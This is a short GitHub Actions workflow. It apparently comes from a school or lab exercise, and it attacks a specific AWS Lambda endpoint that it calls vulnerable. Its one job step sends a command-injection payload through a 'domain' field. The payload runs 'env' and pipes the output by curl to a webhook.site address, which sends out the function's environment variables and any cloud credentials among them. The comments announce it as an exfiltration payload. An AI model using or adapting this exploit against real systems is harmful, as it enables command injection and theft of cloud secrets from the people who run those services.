name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          # PUT YOUR UNIQUE WEBHOOK.SITE URL HERE:
          WEBHOOK="https://webhook.site/8326a6da-11aa-45dc-98de-58b8e5a55807"
          
          # This payload runs nslookup, grabs all environment variables (env), 
          # and POSTs them directly to your browser via your webhook!
          PAYLOAD="{\"domain\": \"127.0.0.1; env | curl -X POST -d @- $WEBHOOK\"}"
          
          echo "=== FIRING EXFILTRATION PAYLOAD ==="
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo "Check your webhook.site tab now!"
